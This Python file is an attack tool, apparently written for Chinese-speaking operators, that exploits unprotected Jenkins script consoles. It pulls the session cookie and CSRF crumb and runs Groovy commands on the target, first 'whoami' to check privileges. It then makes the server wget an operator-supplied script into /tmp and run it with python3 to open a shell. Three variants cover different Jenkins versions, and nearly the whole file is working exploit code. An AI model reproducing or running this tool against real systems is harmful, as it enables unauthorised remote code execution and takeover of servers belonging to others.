import sys
import requests,urllib3
import re
from rich import print as rp
from rich.prompt import Prompt
from concurrent.futures import ThreadPoolExecutor,wait,as_completed
urllib3.disable_warnings()
class Jenkin_WSQ_TO_Shell_Scan:
	def output(self,work,data):
		rp(f"[[b blue]{work}[/b blue]]\t\t[b bright_blue]{data}")
	def poc(self,baseurl):
		cmd = 'whoami'
		url = f"{baseurl}/script"
	
		header = {
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
		}
		self.output("Work","开始模拟登陆...")
		ck = ""
		try:
			req = requests.get(url,verify=False,headers=header)
			if req.headers['Set-Cookie']:
				ck = req.headers['Set-Cookie'].split(";")[0]
			re_jk = re.findall('data-crumb-value="(.*?)">',req.text)
			if re_jk:
				jc = f"Jenkins-Crumb={re_jk[0].strip()}"
				self.output("Work","[b red]模拟登陆成功")
			else:
				self.output("Work", "模拟登陆失败")
				return None,None
		except Exception:
			return None,None
		header2 = {
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
			"Cookie": ck,
			"Referer":f"{baseurl}/script",
			"Content-Type": "application/x-www-form-urlencoded"
		}
	
		data = f'script=println+%22{cmd}%22.execute%28%29.text&Submit=&{jc}&json=%7B%22script%22%3A+%22println+%5C%22{cmd}%5C%22.execute%28%29.text%22%2C+%22%22%3A+%22%3E%26%22%2C+%22Submit%22%3A+%22%22%2C+%22{jc}%22%7D'
		self.output("Work", "开始检测权限...")
		try:
			req2 = requests.post(url,headers=header2,data=data,verify=False)
			match = re.search(r'text="([^"]+)"',req2.text)
	
			if match:
				self.output("Work", "[b red]执行命令成功")
				self.output("Work", "[b red]目标权限如下")
				print(match.group(1).strip())
				if 'root' not in match.group(1):
					self.output("Work", "[b yellow]目标不具备root权限")
	
				else:
					pass
	
			else:
				self.output("Work", "执行命令失败")
		except Exception:
			pass
	
		port = Prompt.ask("[b yellow]输入下载sh的网址")
		shell_cmd = f"wget {port} -P /tmp/"
		data = f'script=println+%22{shell_cmd}%22.execute%28%29.text&Submit=&{jc}&json=%7B%22script%22%3A+%22println+%5C%22{shell_cmd}%5C%22.execute%28%29.text%22%2C+%22%22%3A+%22%3E%26%22%2C+%22Submit%22%3A+%22%22%2C+%22{jc}%22%7D'
		self.output("Work", "开始获取shell...")
		try:
			req3 = requests.post(url, headers=header2, data=data, verify=False)
			match = re.search(r'text="([^"]+)"', req3.text)
	
			if match:
				self.output("Work", "[b red]执行命令成功")
	
				print(match.group(1).strip())
				if "java.io.IOException" in match.group(1):
					self.output("Work", "执行命令失败")
	
			else:
				self.output("Work", "执行命令失败")
		except Exception:
			pass
		file = port.split("/")[-1]
		shell_cmd2 = f"python3 /tmp/{file}"
		data = f'script=println+%22{shell_cmd2}%22.execute%28%29.text&Submit=&{jc}&json=%7B%22script%22%3A+%22println+%5C%22{shell_cmd2}%5C%22.execute%28%29.text%22%2C+%22%22%3A+%22%3E%26%22%2C+%22Submit%22%3A+%22%22%2C+%22{jc}%22%7D'
		self.output("Work", "开始获取shell2...")
		try:
			req3 = requests.post(url, headers=header2, data=data, verify=False)
			match = re.search(r'text="([^"]+)"', req3.text)
	
			if match:
				self.output("Work", "[b red]执行命令成功")
				self.output("Work", "[b red]查看服务器是否监听成功")
				print(match.group(1).strip())
				if "java.io.IOException" in match.group(1):
					self.output("Work", "执行命令失败")
	
			else:
				self.output("Work", "执行命令失败")
		except Exception:
			pass
	
		return ck,jc
	def poc2(self,baseurl):
		cmd = 'whoami'
		url = f"{baseurl}/script"
	
		header = {
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
		}
		self.output("Work","开始模拟登陆...")
		ck = ""
		try:
			req = requests.get(url,verify=False,headers=header)
			if req.headers['Set-Cookie']:
				ck = req.headers['Set-Cookie'].split(";")[0]
				self.output("Work", "模拟登陆成功")
			header2 = {
				"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
				"Cookie": ck,
				"Referer":f"{baseurl}/script",
				"Content-Type": "application/x-www-form-urlencoded"
			}
	
			data = f'script=println+%22{cmd}%22.execute%28%29.text&Submit=%E8%BF%90%E8%A1%8C'
		except Exception:
			return None
		self.output("Work", "开始检测权限...")
		try:
			req2 = requests.post(url,headers=header2,data=data,verify=False)
			match = re.search(r'<h2>Result</h2><pre>([\s\S]+?)</pre>',req2.text)
			if match:
				self.output("Work", "[b red]执行命令成功")
				self.output("Work", "[b red]目标权限如下")
				print(match.group(1).strip())
				if 'root' not in match.group(1):
					self.output("Work", "[b yellow]目标不具备root权限")
	
				else:
					pass
			else:
				self.output("Work", "执行命令失败")
		except Exception:
			pass
	
		port = Prompt.ask("[b yellow]输入下载sh的网址")
		shell_cmd = f"wget {port} -P /tmp/"
		data = f'script=println+%22{shell_cmd}%22.execute%28%29.text&Submit=%E8%BF%90%E8%A1%8C'
		self.output("Work", "开始获取shell...")
		try:
			req3 = requests.post(url, headers=header2, data=data, verify=False)
			match = re.search(r'<h2>Result</h2><pre>([\s\S]+?)</pre>', req3.text)
	
			if match:
				self.output("Work", "[b red]执行命令成功")
	
				print(match.group(1).strip())
				if "java.io.IOException" in match.group(1):
					self.output("Work", "执行命令失败")
	
			else:
				self.output("Work", "执行命令失败")
		except Exception:
			pass
		file = port.split("/")[-1]
		shell_cmd2 = f"python3 /tmp/{file}"
		data = f'script=println+%22{shell_cmd2}%22.execute%28%29.text&Submit=%E8%BF%90%E8%A1%8C'
		self.output("Work", "开始获取shell2...")
		try:
			req3 = requests.post(url, headers=header2, data=data, verify=False)
			match = re.search(r'<h2>Result</h2><pre>([\s\S]+?)</pre>', req3.text)
	
			if match:
				self.output("Work", "[b red]执行命令成功")
				self.output("Work", "[b red]查看服务器是否监听成功")
				print(match.group(1).strip())
				if "java.io.IOException" in match.group(1):
					self.output("Work", "执行命令失败")
	
			else:
				self.output("Work", "执行命令失败")
		except Exception:
			pass
		return ck
	def poc3(self,baseurl):
		url = f"{baseurl}/script"
	
		header = {
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
		}
		self.output("Work","开始模拟登陆...")
		ck = ""
		try:
			req = requests.get(url,verify=False,headers=header)
			if req.headers['Set-Cookie']:
				ck = req.headers['Set-Cookie'].split(";")[0]
				# print(ck)
			re_jk = re.findall('"Jenkins-Crumb", "(.*?)"',req.text)
			if re_jk:
				jc = re_jk[0].strip()
				self.output("Work","[b red]模拟登陆成功")
			else:
				self.output("Work", "模拟登陆失败")
				return None,None
		except Exception:
			return None,None
		header2 = {
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
			"Cookie": ck,
			"Referer":f"{baseurl}/script",
			"Content-Type": "application/x-www-form-urlencoded",
	
		}
		data = f"script=println+%22whoami%22.execute%28%29.text&Jenkins-Crumb={jc}"
		self.output("Work", "开始检测权限...")
		try:
			req2 = requests.post(url,headers=header2,data=data,verify=False)
			match = re.search(r'<h2>Result</h2><pre>([\s\S]+?)</pre>',req2.text)
	
			if match:
				self.output("Work", "[b red]执行命令成功")
				self.output("Work", "[b red]目标权限如下")
				print(match.group(1).strip())
				if 'root' not in match.group(1):
					self.output("Work", "[b yellow]目标不具备root权限")
	
			else:
				self.output("Work", "执行命令失败")
		except Exception:
			pass
		port = Prompt.ask("[b yellow]输入下载sh的网址")
		shell_cmd = f"wget {port} -P /tmp/"
		data = f"script=println+%22{shell_cmd}%22.execute%28%29.text&Jenkins-Crumb={jc}"
		self.output("Work", "开始获取shell...")
		try:
			req3 = requests.post(url, headers=header2, data=data, verify=False)
			match = re.search(r'<h2>Result</h2><pre>([\s\S]+?)</pre>', req3.text)
	
			if match:
				self.output("Work", "[b red]执行命令成功")
				print(match.group(1).strip())
				if "java.io.IOException" in match.group(1):
					self.output("Work", "执行命令失败")
	
			else:
				self.output("Work", "执行命令失败")
		except Exception:
			pass
		file = port.split("/")[-1]
		shell_cmd2 = f"python3 /tmp/{file}"
		data = f"script=println+%22{shell_cmd2}%22.execute%28%29.text&Jenkins-Crumb={jc}"
		self.output("Work", "开始获取shell2...")
		try:
			req3 = requests.post(url, headers=header2, data=data, verify=False)
			match = re.search(r'<h2>Result</h2><pre>([\s\S]+?)</pre>', req3.text)
	
			if match:
				self.output("Work", "[b red]执行命令成功")
				self.output("Work", "[b red]查看服务器是否监听成功")
				print(match.group(1).strip())
				if "java.io.IOException" in match.group(1):
					self.output("Work", "执行命令失败")
	
			else:
				self.output("Work", "执行命令失败")
		except Exception:
			pass
	
		return ck, jc
	def exp(self,baseurl):
		self.output("Work", "开始检测POC-1...")
		ck,jc = self.poc(baseurl)
		if not ck and not jc:
			self.output("Work", "开始检测POC-2...")
			ck,jc = self.poc3(baseurl)
			if not ck and not jc:
				self.output("Work", "开始检测POC-3...")
				ck = self.poc2(baseurl)
				if not ck:
					return

	def main(self,target):
		baseurl = target['url'].strip("/ ")
		self.exp(baseurl)
